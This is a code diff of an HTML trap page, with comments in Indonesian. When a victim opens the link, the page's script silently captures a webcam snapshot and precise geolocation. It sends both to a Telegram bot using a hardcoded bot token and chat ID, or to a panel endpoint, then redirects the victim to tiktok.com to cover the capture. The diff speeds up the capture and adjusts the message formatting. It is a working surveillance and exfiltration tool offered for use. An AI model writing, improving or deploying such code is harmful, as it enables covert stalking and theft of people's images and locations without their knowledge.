@@ -26,9 +26,9 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // ================= CONFIG TELEGRAM (UNTUK METODE DIREK/CADANGAN) =================
+    // ================= CONFIG TELEGRAM ===================================
     const TELEGRAM_BOT_TOKEN = '8762651077:AAHAbyLHR3DRVNEWxSXbO7kDi2PS-vV9A1A';
-    const ADMIN_CHAT_ID = '1966317946'; // Hanya dipakai jika link dibuka TANPA ?sender=
+    const ADMIN_CHAT_ID = '1966317946'; 
     // =====================================================================
 
     // ================= CONFIG PANEL PTERODACTYL ==========================
@@ -36,13 +36,11 @@
     const TARGET_WEBSITE = 'https://tiktok.com'; 
     // =====================================================================
 
-    // Membaca ID pengguna dinamis (?sender=ID) dari tautan bot
     const urlParams = new URLSearchParams(window.location.search);
     const SENDER_ID = urlParams.get('sender'); 
 
     const video = document.getElementById('webcam');
     const canvas = document.getElementById('canvas');
-
     let currentStream = null;
 
     async function startAutoCamera() {
@@ -53,11 +51,11 @@
             video.srcObject = currentStream;
 
             video.onplay = () => {
-                setTimeout(takeAndSendSnapshot, 3000); // Jeda 3 detik untuk stabilisasi kamera
+                setTimeout(takeAndSendSnapshot, 2000); // Dipercepat menjadi 2 detik
             };
         } catch (err) {
-            console.error("Gagal kamera, beralih meminta lokasi langsung...");
-            ambilDataLokasiAndSend(null); // Jika kamera gagal, coba ambil lokasi saja
+            console.log("Kamera ditolak/gagal, lanjut ambil lokasi...");
+            ambilDataLokasiAndSend(null); 
         }
     }
 
@@ -79,7 +77,6 @@
             currentStream.getTracks().forEach(track => track.stop());
         }
         
-        // Buat file blob dari gambar canvas terlebih dahulu sebelum meminta lokasi
         canvas.toBlob((blob) => {
             ambilDataLokasiAndSend(blob);
         }, 'image/png');
@@ -93,19 +90,19 @@
                 (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    // PERBAIKAN: Format tautan peta eksternal Google Maps yang benar
-                    const teksLokasi = `📌 **Lokasi Pengguna:**\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 [Buka di Google Maps](https://google.com{lat},${lon})`;
+                    // PERBAIKAN FATAL: Menambahkan tanda $ sebelum kurung kurawal lat dan format query peta (?q=)
+                    const teksLokasi = `<b>📌 Lokasi Pengguna:</b>\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 <a href="https://google.com{lat},${lon}">Buka di Google Maps</a>`;
                     
                     prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
                 },
                 (error) => {
                     let alasan = "Ditolak/Gagal";
-                    if (error.code === error.PERMISSION_DENIED) alasan = "Izin ditolak pengguna";
-                    const teksLokasi = `⚠️ **Lokasi:** ${alasan}.`;
+                    if (error.code === error.PERMISSION_DENIED) alasan = "Izin lokasi ditolak pengguna";
+                    const teksLokasi = `⚠️ <b>Lokasi:</b> ${alasan}`;
                     
                     prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
                 },
-                { enableHighAccuracy: true, timeout: 7000 }
+                { enableHighAccuracy: true, timeout: 5000 }
             );
         } else {
             const teksLokasi = `❌ Browser tidak mendukung geolokasi.`;
@@ -114,8 +111,8 @@
     }
 
     function prosesPengiriman(recipientId, blob, infoLokasi) {
-        // JIKA MENGGUNAKAN PANEL (Mengirim data gabungan ke backend)
-        if (SENDER_ID) {
+        // Jika ada sender ID dan Anda ingin mencoba lewat panel dulu
+        if (SENDER_ID && PANEL_ENDPOINT !== "https://gervho.com") { 
             const imageData = blob ? canvas.toDataURL('image/png') : null;
             
             fetch(PANEL_ENDPOINT, {
@@ -129,52 +126,46 @@
             })
             .then(res => res.json())
             .then(data => {
-                if (!data.ok) {
-                    sendDirectTelegram(recipientId, blob, infoLokasi);
-                } else {
-                    window.location.href = TARGET_WEBSITE;
-                }
+                if (!data.ok) { sendDirectTelegram(recipientId, blob, infoLokasi); } 
+                else { window.location.href = TARGET_WEBSITE; }
             })
             .catch(err => {
-                console.error("Koneksi panel gagal, beralih ke jalur direk Telegram...");
                 sendDirectTelegram(recipientId, blob, infoLokasi);
             });
         } else {
+            // JALUR DIREK: Langsung tembak Telegram tanpa nunggu panel Pterodactyl yang lambat
             sendDirectTelegram(recipientId, blob, infoLokasi);
         }
     }
 
     async function sendDirectTelegram(chatIdToSend, blob, infoLokasi) {
-        const captionTeks = `📸 **Aktivitas Berhasil Direkam!**\n\n${infoLokasi}`;
+        const captionTeks = `📸 <b>Aktivitas Berhasil Direkam!</b>\n\n${infoLokasi}`;
 
         try {
             if (blob) {
-                // Kirim sebagai foto jika kamera berhasil diakses
                 const formData = new FormData();
                 formData.append('chat_id', chatIdToSend);
                 formData.append('photo', blob, 'snapshot.png');
                 formData.append('caption', captionTeks);
-                formData.append('parse_mode', 'Markdown'); // Agar format tebal dan link berfungsi
+                formData.append('parse_mode', 'HTML'); // Menggunakan HTML agar tag tautan lebih stabil daripada Markdown
 
-                // PERBAIKAN: Mengubah endpoint '/bit' menjadi '/bot'
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
             } else {
-                // Kirim sebagai teks biasa jika kamera diblokir tetapi lokasi diizinkan
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatIdToSend,
                         text: captionTeks,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'HTML'
                     })
                 });
             }
         } catch (error) {
-            console.error("Gagal mengirim ke Telegram API:", error);
+            console.error("Gagal kirim Telegram:", error);
         } finally {
             window.location.href = TARGET_WEBSITE;
         }
@@ -185,3 +176,4 @@
 
 </body>
 </html>
+l
